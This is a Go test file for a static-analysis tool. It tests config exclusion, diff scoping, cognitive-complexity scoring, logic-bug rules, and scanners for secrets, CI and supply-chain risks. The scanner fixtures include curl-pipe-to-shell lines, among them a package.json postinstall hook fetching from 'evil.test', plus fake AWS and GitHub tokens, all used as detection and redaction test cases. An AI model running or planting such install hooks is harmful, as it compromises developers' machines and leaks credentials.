package analyzer

import (
	"context"
	"strings"
	"testing"
)

func TestRepoConfigAndGitAttributesExclusion(t *testing.T) {
	baseYAML := []byte(`
exclude:
  - "dist/*"
  - "*.pb.go"
complexity:
  high: 10
  max_new: 5
rules:
  CI.unpinned-action:
    enabled: false
  CONTAINER.root-user:
    severity: critical
`)
	gitattr := []byte("generated/** linguist-generated=true\n")
	cfg, err := LoadRepoConfig(baseYAML, gitattr)
	if err != nil {
		t.Fatalf("LoadRepoConfig failed: %v", err)
	}
	if !cfg.Excluded("dist/bundle.js") || !cfg.Excluded("api/user.pb.go") || !cfg.Excluded("generated/schema.ts") {
		t.Fatal("expected dist/*, *.pb.go, and linguist-generated paths excluded")
	}
	if cfg.Excluded("src/app.ts") {
		t.Fatal("src/app.ts should not be excluded")
	}
	if cfg.Complexity.High != 10 || cfg.Complexity.MaxNew != 5 {
		t.Fatalf("unexpected complexity config: %+v", cfg.Complexity)
	}
}

func TestUnifiedDiffNewCodeScoping(t *testing.T) {
	patch := strings.Join([]string{
		"diff --git a/src/app.ts b/src/app.ts",
		"--- a/src/app.ts",
		"+++ b/src/app.ts",
		"@@ -10,3 +10,4 @@",
		" const a = 1;",
		"+const b = 2;",
		"+const c = 3;",
		" const d = 4;",
	}, "\n")
	diff := ParseUnifiedDiff(patch)
	if !diff.IsNew("src/app.ts", 11) || !diff.IsNew("src/app.ts", 12) {
		t.Fatalf("expected lines 11 and 12 marked new: %+v", diff)
	}
	if diff.IsNew("src/app.ts", 10) || diff.IsNew("src/app.ts", 13) {
		t.Fatalf("context lines 10 and 13 should not be marked new: %+v", diff)
	}
}

func TestDeletionOnlyDiffDoesNotRunUnscopedFindings(t *testing.T) {
	diff := ParseUnifiedDiff("diff --git a/a.go b/a.go\n--- a/a.go\n+++ /dev/null\n@@ -1 +0,0 @@\n-old")
	if !diff.HasDiff || len(diff.Files) != 0 {
		t.Fatalf("expected deletion-only scoped diff: %+v", diff)
	}
	findings := RunAll(context.Background(), RunInput{Files: map[string][]byte{"bad.go": []byte("func f(x []int) { for i := 0; i <= len(x); i++ { _ = x[i] } }")}, Diff: diff})
	for _, finding := range findings {
		if finding.RuleID == "LOGIC.bounds" {
			t.Fatalf("unrelated finding leaked into deletion-only diff: %+v", finding)
		}
	}
}

func TestBoundsAndNullableGuardPolarity(t *testing.T) {
	src := []byte("func f(x []int) { for i := 0; i <= len(x)-0; i++ { _ = x[i] } }")
	findings := AnalyzeLogic("a.go", src)
	found := false
	for _, finding := range findings {
		found = found || finding.RuleID == "LOGIC.bounds"
	}
	if !found {
		t.Fatal("expected len(x)-0 to retain the off-by-one finding")
	}
	if isParamGuardedBeforeDeref("user", "if (!user) { user.name }") {
		t.Fatal("negated open guard must not protect dereference")
	}
	if isParamGuardedBeforeDeref("user", "if (user == null) { log(user); } return user.name") {
		t.Fatal("closed guard without an early exit must not protect later dereference")
	}
}

func TestSonarCognitiveComplexityAcrossLanguages(t *testing.T) {
	// 1. TypeScript: boolean sequences (`a && b && c` = +1; `a && b || c` = +2), else if (+1 no nesting), nested lambda (+0, increases nesting)
	tsSrc := []byte(`
export function evaluate(a: boolean, b: boolean, c: boolean, xs: number[]) {
  if (a && b && c) { // +1 (if) +1 (&& seq) = 2
    for (const x of xs) { // +2 (for, nest 1)
      if (x > 0 || x < -5) { // +3 (if, nest 2) +1 (||) = 4
        return x;
      } else if (x === 0) { // +1 (else if hybrid)
        return 0;
      } else { // +1 (else hybrid)
        return -1;
      }
    }
  }
  const fn = () => { // +0, nest -> 1
    if (a) { // +2 (if at nest 1)
      return 1;
    }
    return 0;
  };
  return fn();
}

`)
	tsFns, err := CognitiveComplexities("src/eval.ts", tsSrc)
	if err != nil {
		t.Fatalf("TS complexity failed: %v", err)
	}
	if len(tsFns) != 1 || tsFns[0].Name != "evaluate" {
		t.Fatalf("expected 1 function 'evaluate', got %+v", tsFns)
	}
	// Expected: 2 + 2 + 4 + 1 + 1 + 2 = 12
	if tsFns[0].Score != 12 {
		t.Fatalf("expected TS Cognitive Complexity = 12, got %d", tsFns[0].Score)
	}

	// 2. Recursion (+1) in Go + mixed boolean sequence (`&&` then `||` = +2)
	goSrc := []byte(`package p
func fact(n int, a, b, c bool) int {
	if a && b || c { // +1 (if) + 2 (&& -> ||) = 3
		return 1
	}
	if n <= 1 { // +1
		return 1
	}
	return n * fact(n-1, a, b, c) // +1 recursion
}
`)
	goFns, err := CognitiveComplexities("pkg/math.go", goSrc)
	if err != nil || len(goFns) != 1 {
		t.Fatalf("Go complexity failed: err=%v fns=%+v", err, goFns)
	}
	if goFns[0].Score != 5 {
		t.Fatalf("expected Go Cognitive Complexity = 5, got %d", goFns[0].Score)
	}

	// 3. Python elif chain + except
	pySrc := []byte(`
def parse(x):
    try:
        if x == 1:      # +1
            return "a"
        elif x == 2:    # +1
            return "b"
        else:           # +1
            return "c"
    except ValueError:  # +1
        return "err"
`)
	pyFns, err := CognitiveComplexities("app.py", pySrc)
	if err != nil || len(pyFns) != 1 {
		t.Fatalf("Python complexity failed: err=%v fns=%+v", err, pyFns)
	}
	if pyFns[0].Score != 4 {
		t.Fatalf("expected Python Cognitive Complexity = 4, got %d", pyFns[0].Score)
	}
}

func TestCognitiveComplexitySkipsNonProductionPaths(t *testing.T) {
	src := []byte(`export function complicated(a, b, c) {
  if (a) { if (b) { if (c) { if (a) { if (b) { if (c) { if (a) { if (b) { return c; } } } } } } }
  return 0;
}`)
	for _, path := range []string{
		"pkg/logic_test.go",
		"pkg/logic.test.ts",
		"pkg/testdata/logic.ts",
		"evals/cases/logic.ts",
		"pkg/golden/logic.ts",
	} {
		functions, findings := ComputeComplexityFindings(path, src, nil, ComplexityConfig{}, Diff{})
		if len(functions) != 0 || len(findings) != 0 {
			t.Errorf("expected complexity analysis to skip %q, got functions=%+v findings=%+v", path, functions, findings)
		}
	}
	functions, findings := ComputeComplexityFindings("pkg/logic.ts", src, nil, ComplexityConfig{}, Diff{})
	if len(functions) != 1 || len(findings) != 1 || findings[0].RuleID != "COMPLEXITY.cognitive-high" {
		t.Fatalf("expected production complexity finding, got functions=%+v findings=%+v", functions, findings)
	}
}

func TestLogicZeroFalsePositivesAndTruePositives(t *testing.T) {
	// Zero-FP regression cases from PR #66!
	cleanTS := []byte(`
export const ENV = { googleSecret: 'AUTH_GOOGLE_CLIENT_SECRET' } as const;
export function process(opts: { cursor?: string | undefined }, user: { deleting: boolean }, row: { deleted: boolean }, wanted: string | undefined, charge?: { amount: number }) {
  if (!!user && !user.deleting) {
    return opts.cursor;
  }
  if (row && !row.deleted) {
    return "ok";
  }
  if (!row || !wanted) return null;
  const w = wanted.toLowerCase();
  const amt = charge ? charge.amount : 0;
  internalMutation({
    handler: async (ctx: any) => {
      const q = ctx.db.query("items");
      const msg = ` + "`updated ${w} ${amt}`" + `;
      return q ? msg : null;
    },
  });
  try {
    return "try";
  } catch (err) {
    // intentionally ignored
  }
  return null;
}
`)
	cleanFindings := append(AnalyzeLogic("src/clean.ts", cleanTS), ScanFile("src/clean.ts", cleanTS)...)
	if len(cleanFindings) != 0 {
		t.Fatalf("expected ZERO false positives on clean PR #66 patterns, got: %+v", cleanFindings)
	}

	// True-positive cases: contradiction, empty catch, duplicate branch, unguarded nullable param
	buggyTS := []byte(`
export function buggy(user: { name: string } | null) {
  const n = user.name;
  if (flag && !flag) {
    return n;
  }
  if (a > 0) {
    return 42;
  } else {
    return 42;
  }
  try {
    doWork();
  } catch (e) {}
}
`)
	bugFindings := AnalyzeLogic("src/buggy.ts", buggyTS)
	rules := map[string]bool{}
	for _, f := range bugFindings {
		rules[f.RuleID] = true
	}
	for _, want := range []string{"LOGIC.dead-branch", "LOGIC.unhandled-error", "LOGIC.duplicate-branch", "LOGIC.null-deref"} {
		if !rules[want] {
			t.Fatalf("expected rule %s in buggy.ts findings, got %+v", want, bugFindings)
		}
	}
}

func TestScannersClonesAndRuleConfigApplication(t *testing.T) {
	dupBlock := strings.Join([]string{
		"const step1 = computeAlphaValue(inputRecord.id, inputRecord.tenant);",
		"const step2 = computeBetaValue(step1.normalized, inputRecord.region);",
		"const step3 = combineGammaMetrics(step1.score, step2.score, 0.85);",
		"const step4 = formatDiagnosticSummary(step3, inputRecord.label);",
		"const step5 = persistAuditSnapshot(step4, inputRecord.timestamp);",
		"return { summary: step4, persisted: step5, score: step3 };",
	}, "\n")

	cfg, err := LoadRepoConfig([]byte(`
rules:
  CI.unpinned-action:
    enabled: false
  CONTAINER.root-user:
    severity: critical
`), nil)
	if err != nil {
		t.Fatal(err)
	}

	files := map[string][]byte{
		".github/workflows/ci.yml": []byte("on: pull_request_target\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@main\n"),
		"Dockerfile":               []byte("FROM alpine:3.20\nUSER root\nRUN curl -s https://example.com/i.sh | sh\n"),
		"package.json":             []byte(`{"dependencies":{"badpkg":"latest"},"scripts":{"postinstall":"curl -s https://evil.test | sh"}}`),
		"src/a.ts":                 []byte("export function a(inputRecord: any) {\n" + dupBlock + "\n}\n"),
		"src/b.ts":                 []byte("export function b(inputRecord: any) {\n" + dupBlock + "\n}\n"),
		"src/secrets.ts":           []byte("const k = \"AKIA1234567890ABCDEF\";\nconst placeholder = \"api_key='placeholder_example_1234567890'\";\n"),
	}

	findings := RunAll(context.Background(), RunInput{
		Files:  files,
		Config: cfg,
	})

	byRule := map[string]Finding{}
	for _, f := range findings {
		byRule[f.RuleID] = f
	}
	if _, disabled := byRule["CI.unpinned-action"]; disabled {
		t.Fatal("expected disabled rule CI.unpinned-action suppressed by RepoConfig")
	}
	if rootF, ok := byRule["CONTAINER.root-user"]; !ok || rootF.Severity != "critical" {
		t.Fatalf("expected CONTAINER.root-user overridden to critical, got %+v", rootF)
	}
	for _, want := range []string{
		"SECURITY.secret",
		"CI.pull-request-target",
		"CONTAINER.curl-pipe-shell",
		"SUPPLYCHAIN.unpinned-dependency",
		"SUPPLYCHAIN.suspicious-install-script",
		"CLONE.duplicate-block",
	} {
		if _, ok := byRule[want]; !ok {
			t.Fatalf("expected %s finding, got rules: %+v", want, byRule)
		}
	}
}

func TestLifecycleScriptEvidenceRedactsCredentials(t *testing.T) {
	token := "ghp_123456789012345678901234567890abcdef"
	findings := ScanFile("package.json", []byte(`{"scripts":{"postinstall":"curl -H 'Authorization: Bearer abc.def.ghi' https://example.test/`+token+` | sh"}}`))
	for _, finding := range findings {
		if finding.RuleID != "SUPPLYCHAIN.suspicious-install-script" {
			continue
		}
		if strings.Contains(finding.Evidence, token) || strings.Contains(finding.Evidence, "abc.def.ghi") {
			t.Fatalf("lifecycle evidence contains a credential: %q", finding.Evidence)
		}
		if !strings.Contains(finding.Evidence, "[REDACTED]") {
			t.Fatalf("expected credential redaction marker in evidence, got %q", finding.Evidence)
		}
		return
	}
	t.Fatal("expected suspicious lifecycle-script finding")
}

func TestDetectClonesSkipsTestFiles(t *testing.T) {
	dupBlock := strings.Join([]string{
		"const step1 = computeAlphaValue(inputRecord.id, inputRecord.tenant);",
		"const step2 = computeBetaValue(step1.normalized, inputRecord.region);",
		"const step3 = combineGammaMetrics(step1.score, step2.score, 0.85);",
		"const step4 = formatDiagnosticSummary(step3, inputRecord.label);",
		"const step5 = persistAuditSnapshot(step4, inputRecord.timestamp);",
		"return { summary: step4, persisted: step5, score: step3 };",
	}, "\n")
	findings := DetectClones(map[string][]byte{
		"cloud/tests/account-purge.test.ts": []byte("export function setupA(inputRecord: any) {\n" + dupBlock + "\n}\n"),
		"cloud/tests/account-sweep.test.ts": []byte("export function setupB(inputRecord: any) {\n" + dupBlock + "\n}\n"),
		"pkg/foo_test.go":                   []byte("func setupC() {\n" + dupBlock + "\n}\n"),
	}, 6)
	if len(findings) != 0 {
		t.Fatalf("expected DetectClones to skip test files, got %+v", findings)
	}
}
